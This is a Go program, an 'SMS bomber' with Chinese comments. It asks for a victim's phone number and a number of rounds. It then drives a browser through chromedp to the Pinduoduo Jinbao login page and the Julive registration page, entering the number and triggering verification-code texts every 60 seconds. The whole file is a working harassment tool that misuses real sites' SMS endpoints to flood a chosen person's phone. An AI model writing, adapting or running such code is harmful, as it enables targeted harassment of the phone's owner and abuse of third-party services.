package main

import (
	"context"
	"fmt"
	"log"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/chromedp/chromedp"
)

var (
	// 轰炸手机号
	phoneNum string

	// 轰炸总次数
	totalTimes int

	// 是否开始
	isStart int

	// 等待组
	waitGroup sync.WaitGroup

	// 浏览器标识
	userAgent = `Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36`

	// 是否加载页面图片
	isLoadImg = false

	// 是否为无头浏览器
	isHeadless = false
)

func main() {
	fmt.Println("请输入要轰炸的手机号及波次（以空格分隔）")
	fmt.Scanf("%s %d", &phoneNum, &totalTimes)
	fmt.Println("您要轰炸的手机号为[", phoneNum, "]，轰炸波次为[", totalTimes, "]次，是否开始？ 0-放弃，1-开始")
	fmt.Scan(&isStart)

	if isStart == 0 {
		fmt.Println("您已放弃，轰炸未执行")
		return
	}

	// 执行
	for i := 0; i < totalTimes; i++ {
		if i != 0 {
			// 一般网站60秒只能发一次
			time.Sleep(60 * time.Second)
		}

		fmt.Println("轰炸任务开始执行，当前波次[", i+1, "]")

		// 添加任务
		waitGroup.Add(2)
		go ddjbSendCode() // 多多进宝
		go jlmfSenCode()  // 居里买房
	}

	waitGroup.Wait()
	fmt.Println("全部任务执行结束")
}

// 多多进宝
func ddjbSendCode() {
	var (
		// 登录首页
		loginUrl = `https://jinbao.pinduoduo.com/`

		// 登录按钮
		loginBtnPath = `#__next > div.jsx-3954532995.container > section > div > div.login-wrapper.right > div > span`

		// 手机号
		mobilePhonePath = `#mobile`

		// 发送验证码
		sendCodePath = `body > div.MDL_outerWrapper_14d8fyu.MDL_modal_14d8fyu.MDL_showCloseIcon_14d8fyu > div > div > div.MDL_body_14d8fyu > div > div.login-code-wrapper > div.code-line > button > span`

		// 计时器
		timepiece string
	)

	ctx, _ := chromedp.NewExecAllocator(context.Background(), append(
		chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("blink-settings", "imagesEnabled="+strconv.FormatBool(isLoadImg)), // 不显示图片
		chromedp.Flag("headless", isHeadless),
		chromedp.UserAgent(userAgent),
	)...)

	ctx, _ = context.WithTimeout(ctx, 30*time.Second)
	ctx, _ = chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf))

	// 关闭浏览器
	defer chromedp.Cancel(ctx)
	defer waitGroup.Done()

	err := chromedp.Run(ctx,
		chromedp.Navigate(loginUrl),
		chromedp.Click(loginBtnPath),
		chromedp.SendKeys(mobilePhonePath, phoneNum, chromedp.ByID),
		chromedp.Click(sendCodePath),
		chromedp.Sleep(3*time.Second),
		chromedp.Text(sendCodePath, &timepiece),
	)

	if err != nil {
		fmt.Println(currentTime()+"多多进宝验证码发送失败", timepiece, err.Error())
		return
	}

	// 失败时“获取验证码”提示
	if !strings.Contains(timepiece, "获取验证码") {
		fmt.Println(currentTime()+"多多进宝验证码发送成功", timepiece)
		return
	}

	fmt.Println(currentTime()+"多多进宝验证码发送失败", timepiece)
}

// 当前时间
func currentTime() string {
	return "[" + time.Now().Format("2006-01-02 15:04:05") + "] "
}

// 居里买房
func jlmfSenCode() {
	var (
		// 注册页面
		registerUrl = `https://hz.julive.com/site/register?reset=0`

		// 手机号
		mobilePhonePath = `#register-mobile`

		// 发送验证码
		sendCodePath = `#register-get-captcha-btn`

		// 计时器
		timepiece string
	)

	ctx, _ := chromedp.NewExecAllocator(context.Background(), append(
		chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("blink-settings", "imagesEnabled="+strconv.FormatBool(isLoadImg)), // 不显示图片
		chromedp.Flag("headless", isHeadless),
		chromedp.UserAgent(userAgent),
	)...)

	ctx, _ = context.WithTimeout(ctx, 30*time.Second)
	ctx, _ = chromedp.NewContext(ctx, chromedp.WithLogf(log.Printf))

	// 关闭浏览器
	defer chromedp.Cancel(ctx)
	defer waitGroup.Done()

	err := chromedp.Run(ctx,
		chromedp.Navigate(registerUrl),
		chromedp.SendKeys(mobilePhonePath, phoneNum, chromedp.ByID),
		chromedp.Click(sendCodePath, chromedp.ByID),
		chromedp.Sleep(2*time.Second),
		chromedp.Text(sendCodePath, &timepiece, chromedp.ByID),
	)

	if err != nil {
		fmt.Println(currentTime()+"居里买房验证码发送失败", timepiece, err.Error())
		return
	}

	// 56秒后可重发验证码
	if strings.Contains(timepiece, "秒后可重发验证码") {
		fmt.Println(currentTime()+"居里买房验证码发送成功", timepiece)
		return
	}

	fmt.Println(currentTime()+"居里买房验证码发送失败", timepiece)
}
